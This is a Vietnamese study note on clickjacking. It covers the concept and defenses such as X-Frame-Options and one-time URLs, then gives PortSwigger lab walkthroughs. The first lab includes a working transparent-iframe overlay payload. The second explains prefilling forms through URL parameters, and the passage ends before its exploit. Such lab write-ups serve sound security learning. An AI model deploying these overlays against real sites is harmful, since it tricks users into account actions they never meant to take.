# Clickjacking

## Khái niệm

Clickjacking là một cuộc tấn công dựa trên giao diện trong đó người dùng bị lừa nhấp vào nội dung có thể hành động trên một trang web ẩn bằng cách nhấp vào một số nội dung khác trong trang web giả mạo.

Một cuộc tấn công bằng clickjacking sử dụng các tính năng dường như vô hại của HTML và JavaScript để buộc nạn nhân thực hiện các hành động không mong muốn, chẳng hạn như nhấp vào một nút ẩn thực hiện một thao tác ngoài ý muốn. Đây là một vấn đề bảo mật phía máy khách ảnh hưởng đến nhiều trình duyệt và nền tảng khác nhau.

- Clickjacking là một hình thức tấn công đánh lừa người dùng nhấp chuột vô ý vào một đối tượng trên website. Khi nhấp chuột vào một đối tượng trên màn hình, người dùng nghĩ là mình đang click vào đối tượng đó nhưng thực chất họ đang bị lừa click vào một đối tượng khác > đã bị làm mờ hay ẩn đi. Kẻ tấn công có thể sử dụng kỹ thuật tấn công này cho nhiều mục đích. Đánh cắp tài khoản người dùng, lừa click vào quảng cáo để kiếm tiền, lừa like page hoặc nguy hiểm hơn là cài một webshell lên máy chủ web.

![image](https://hackmd.io/_uploads/BJRJogSkJg.png)

## prevent

Cách phòng tránh
Ngày nay để ngăn chặn tấn công Clickjacking khá dễ dàng. Có 2 phương diện để phòng tránh Clickjacking bao gồm từ phía client và server.

Về phía Client, cách phòng tránh tốt nhất là người dùng nên cảnh giác đối với những đường link lạ với các nội dung hướng người dùng đến việc click chuột như: Click để nhận phần thưởng, Click để quay số vv...
Về phía Server sẽ có nhiều cách để phòng tránh Clickjacking:
Sử dụng tùy chọn X-Frame: Giải pháp này của Microsoft là một trong những giải pháp hiệu quả nhất chống lại các cuộc tấn công clickjacking trên máy tính của bạn. Bạn có thể bao gồm tiêu đề HTTP X-Frame-Options trong tất cả các trang web của bạn. Điều này sẽ ngăn không cho trang web của bạn bị nhúng vào trong 1 khung thông qua các thẻ như: `<frame>, <iframe>, <object>`. X-Frame được hỗ trợ bởi các phiên bản mới nhất của hầu hết các trình duyệt bao gồm Safari, Chrome, IE.

Di chuyển các phần tử trên trang của bạn: Hacker chỉ có thể tấn công Clickjacking khi biết nó cấu trúc của trang web và từ đó đặt được những điểm Click ẩn. Bằng cách di chuyển phần tử đó liên tục đến các vị trí khác nhau, Hacker sẽ rất khó để có thể lợi dụng lỗ hổng trên để khai thác. Vấn đề duy nhất với giải pháp này là sẽ khiến người dùng cảm thấy khó tiếp cận và sử dụng trang web.

Sử dụng URL một lần: Đây là một phương pháp khá tiên tiến để bảo vệ chống lại những kẻ lừa đảo. Bạn có thể làm cho cuộc tấn công trở nên khó khăn hơn nhiều nếu bạn sử dụng URL 1 lần vào các trang quan trọng. Việc sử dụng url 1 lần khiến hacker không thể nhúng url vào trong trang web để thực hiện khai thác. Điều này tương tự như nonces được sử dụng để ngăn chặn CSRF nhưng độc đáo theo cách nó bao gồm nonces trong các URL để nhắm mục tiêu các trang, không phải trong các hình thức trong các trang đó (khá giống với cách Wordpress sử dụng wp-nonce trên URL).

## Lab

## 1.Lab: Basic clickjacking with CSRF token protection

link: https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected

### Đề bài

![image](https://hackmd.io/_uploads/rylR9TeH1Jl.png)

### Khai thác

```htmlembedded
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:515;
        left:60;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0a75007603626346808d947f005500f3.web-security-academy.net/my-account"></iframe>
```

## 2. Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

link: https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss

### Đề bài

![image](https://hackmd.io/_uploads/ryfzNbSkyl.png)

### Phân tích

Việc dùng iframe để điền tự động form dựa trên việc truyền tham số qua URL thường khai thác khả năng của các trang web để xử lý truy vấn hoặc dữ liệu được gửi qua URL. Cụ thể, cách thức hoạt động có thể được mô tả như sau:

Cơ chế GET với URL Parameters:

Khi một trang web sử dụng phương thức GET để gửi dữ liệu, dữ liệu thường được đính kèm ngay trong URL dưới dạng các tham số truy vấn (query parameters). Ví dụ: https://example.com/form?name=Cuong&email=test@example.com.
Khi tải trang này, trang có thể đọc các tham số name và email từ URL và tự động điền vào các trường tương ứng trong form.
Tương tác với iframe:

Nếu trang web được nhúng vào một iframe, và URL của trang đó bao gồm các tham số truy vấn chứa dữ liệu (như tên, email...), trang bên trong iframe có thể lấy dữ liệu này và tự động điền vào form mà không cần người dùng tương tác thủ công.
Các trang web thường có JavaScript hoặc code phía backend để đọc các tham số từ URL và hiển thị dữ liệu này trong các trường của form.
Kịch bản điền form tự động:

Trang chính (trang chứa iframe) có thể định nghĩa URL của iframe sao cho nó chứa các tham số truy vấn thích hợp, ví dụ:
html
Sao chép mã
`<iframe src="https://example.com/form?name=Cuong&email=test@example.com"></iframe>`
Khi trang form trong iframe được tải, các giá trị name và email từ URL sẽ được nhận biết và tự động điền vào form.
Tính năng này có thể bị khai thác:

Nếu một trang không kiểm tra chặt chẽ các tham số được truyền qua URL, nó có thể bị lợi dụng cho các mục đích không mong muốn, chẳng hạn như tự động điền form mà người dùng không biết.
Ví dụ, có thể sử dụng tính năng này để lừa người dùng submit form mà họ không nhận ra, điều này liên quan đến lỗ hổng như Cross-Site Request Forgery (CSRF).
Tóm lại, khi tham số được truyền qua URL và trang web xử lý chúng mà không kiểm soát kỹ càng, nó có thể dẫn đến việc form được điền tự động từ các trang bên ngoài thông qua iframe.

### Khai thác
